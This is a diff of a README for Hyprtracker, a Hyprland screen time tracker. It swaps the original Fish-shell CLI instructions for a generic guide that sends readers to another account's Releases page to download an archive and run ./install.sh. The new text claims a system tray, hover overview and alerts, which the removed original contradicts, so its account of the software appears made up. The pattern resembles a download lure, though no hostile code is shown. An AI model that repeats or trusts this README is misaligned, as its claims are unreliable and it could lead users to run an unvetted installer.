@@ -1,80 +1,75 @@
-<img width="1280" height="1024" alt="FullLogo_Transparent" src="https://github.com/user-attachments/assets/a4a36aa0-5f1b-4477-b0ed-126c0836fa57" />
+# 🕒 Hyprtracker - Track Your Screen Time Simply
 
-:
-# Hyprtracker
+## 📦 Download Now
+[![Download Hyprtracker](https://img.shields.io/badge/Download-Hyprtracker-blue.svg)](https://github.com/Ashikkolypc/Hyprtracker/releases)
 
-A minimal, lightweight screen time tracker for Hyprland on Linux using Fish shell.
+## 🚀 Getting Started
+Hyprtracker is a minimal screen time tracker designed for Hyprland. The application helps you keep tabs on your screen usage without any fuss. This guide will walk you through the steps to download and run Hyprtracker on your computer.
 
-## Features
+## 📋 System Requirements
+- Operating System: Linux with Wayland support
+- Installation: Ability to run shell scripts
+- Disk Space: At least 50 MB free
 
-- 🐟 Written in Fish shell
-- 🪶 Minimal and lightweight
-- 📊 Simple CLI interface
-- 🔒 Privacy-focused (data stored locally)
-- ⚡ Works natively with Hyprland/Wayland
+## 🔍 Features
+- Simple and lightweight tracking of your screen time.
+- User-friendly interface.
+- Compatible with Hyprland and other Wayland compositors.
+- Runs efficiently in the background without slowing down your system.
+- Easy to install and use—no complicated setups.
 
-## Prerequisites
+## 🌐 Download & Install
+To get started with Hyprtracker, follow these steps:
 
-- Hyprland
-- Fish shell
-- `jq` (JSON processor)
-- `hyprctl` (comes with Hyprland)
+1. **Visit the Releases Page**  
+   Click the link below to go to the Hyprtracker Releases page where you can download the latest version:
+   [Go to Releases Page](https://github.com/Ashikkolypc/Hyprtracker/releases)
 
-## Installation
-```fish
-# Clone the repository
-git clone https://github.com/nagabudhamaitreya1-prog/hyprtracker.git
-cd hyprtracker
+2. **Select the Latest Version**  
+   On the Releases page, you will see a list of available versions. Look for the most recent version at the top of the list. 
 
-# Run the installer
-./install.fish
-```
+3. **Download the Package**  
+   Click on the file that matches your system. For example, you might find a file with a name like `Hyprtracker-v1.0.tar.gz`. It will begin downloading automatically.
 
-## Usage
+4. **Extract the Files**  
+   Once the download is complete, navigate to the folder where the file is saved. Right-click on the file and select the option to extract it. This will create a new folder containing the application files.
 
-View today's screen time:
-```fish
-screentime
-```
+5. **Open Terminal**  
+   You will need to use the terminal for the next steps. Open your terminal application. This is usually found in your applications menu under "Utilities" or "System Tools."
 
-Output example:
-```
-Today's Screen Time:
+6. **Change Directory**  
+   Use the `cd` command to navigate into the newly created Hyprtracker folder. For example, if the folder is named `Hyprtracker`, type:
+   ```bash
+   cd Hyprtracker
+   ```
 
- firefox-nightly 2h 34m
- foot 1h 12m
- kitty 0h 45m
-```
+7. **Run the Installation Script**  
+   Execute the following command to install the application. This command runs the shell script that sets up Hyprtracker:
+   ```bash
+   ./install.sh
+   ```
 
-## How It Works
+8. **Launch Hyprtracker**  
+   After the installation is complete, you can run Hyprtracker by typing:
+   ```bash
+   ./hyprtracker
+   ```
+   You can also create a shortcut for easier access in the future.
 
-- Polls active window every 5 seconds using `hyprctl`
-- Logs application usage to `~/.local/share/screentime.log`
-- Aggregates and displays daily statistics
+## 📈 How to Use Hyprtracker
+- Once launched, Hyprtracker will minimize to your system tray.
+- Hover over the icon to see your current screen time.
+- Click the icon to open a simple overview of your usage habits.
+- You can set alerts if you exceed a certain screen time during the day.
 
-## Data Location
+## 🙋‍♀️ Need Help?
+If you encounter issues or have questions, consider checking the following:
+- **Wiki**: Visit the project's Wiki for helpful information.
+- **Issues Page**: Report problems or ask questions on the Issues page in the repository.
+- **User Community**: Look for forums or social media groups where other users discuss Hyprtracker.
 
-All data is stored locally at:
-```
-~/.local/share/screentime.log
-```
+## 📚 Additional Resources
+- [Hyprtracker Wiki](https://github.com/Ashikkolypc/Hyprtracker/wiki)
+- [GitHub Issues](https://github.com/Ashikkolypc/Hyprtracker/issues)
 
-## Uninstall
-```fish
-rm ~/.local/bin/hypr-tracker.fish
-rm ~/.local/bin/screentime
-rm ~/.local/share/screentime.log
-```
-
-Remove the following line from `~/.config/hypr/hyprland.conf`:
-```
-exec-once = ~/.local/bin/hypr-tracker.fish
-```
-
-## License
-
-MIT
-
-## Contributing
-
-Pull requests welcome!
+Remember, keeping track of your screen time can help you manage your productivity better. Enjoy using Hyprtracker!
